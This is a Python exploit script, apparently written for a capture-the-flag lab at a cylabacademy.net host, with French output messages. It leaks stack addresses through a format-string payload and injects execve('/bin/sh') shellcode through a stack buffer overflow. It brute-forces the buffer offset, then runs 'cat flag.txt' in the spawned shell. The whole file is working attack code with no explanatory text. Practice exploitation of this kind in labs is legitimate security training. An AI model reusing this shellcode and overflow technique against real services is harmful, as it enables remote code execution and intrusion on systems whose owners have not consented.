import sys, socket, time, re, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = "chatelaine.cylabacademy.net", 26060
SC = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")
FMT = ".".join(["%p"] * 40) + "\n"
DELTAS = [0x198, 0x1a8, 0x180, 0x150, 0x1c0, 0x170, 0x1d0, 0x160]


def try_exploit(cand_idx, delta):
    try:
        s = socket.create_connection((host, port), timeout=12)
        s.settimeout(5)
    except Exception:
        return None, None
    try:
        s.sendall(FMT.encode())
        out = b""
        t0 = time.time()
        while out.count(b"0x") < 25 and time.time() - t0 < 5:
            try:
                c = s.recv(8192)
                if not c:
                    break
                out += c
            except socket.timeout:
                break
        vals = re.findall(rb"0x[0-9a-f]+", out)
        stacks = [int(v, 16) for v in vals if 0x7f0000000000 <= int(v, 16) <= 0x7fffffffffff]
        if len(stacks) <= cand_idx:
            s.close()
            return None, None
        buf = stacks[cand_idx] - delta
        payload = SC + b"\x90" * (0x70 - len(SC)) + b"B" * 8 + struct.pack("<Q", buf)
        if b"\n" in payload:
            s.close()
            return None, "nl"
        s.sendall(payload + b"\n")
        time.sleep(0.35)
        s.sendall(b"cat flag.txt; ls\n")
        res = b""
        t0 = time.time()
        while time.time() - t0 < 6:
            try:
                c = s.recv(8192)
                if not c:
                    break
                res += c
            except socket.timeout:
                break
        s.close()
        return res.decode("latin-1", "replace"), (buf, stacks[cand_idx])
    except Exception as e:
        return None, str(e)


found = None
for cyc in range(24):
    idx = cyc // len(DELTAS)
    delta = DELTAS[cyc % len(DELTAS)]
    txt, info = try_exploit(idx, delta)
    tag = ""
    if isinstance(info, tuple):
        tag = "idx=%d delta=0x%x buf=0x%x" % (idx, delta, info[0])
    print("essai %2d %s -> %s" % (cyc + 1, tag or str(info)[:40], (txt or "")[-90:].replace("\n", " ")))
    if txt and re.search(r"\b[0-9a-f]{20,40}\b", txt) and "flag.txt" in txt:
        found = txt
        break
if found:
    m = re.search(r"\b[0-9a-f]{20,40}\b", found)
    print("CANDIDAT FLAG:", m.group(0) if m else None)
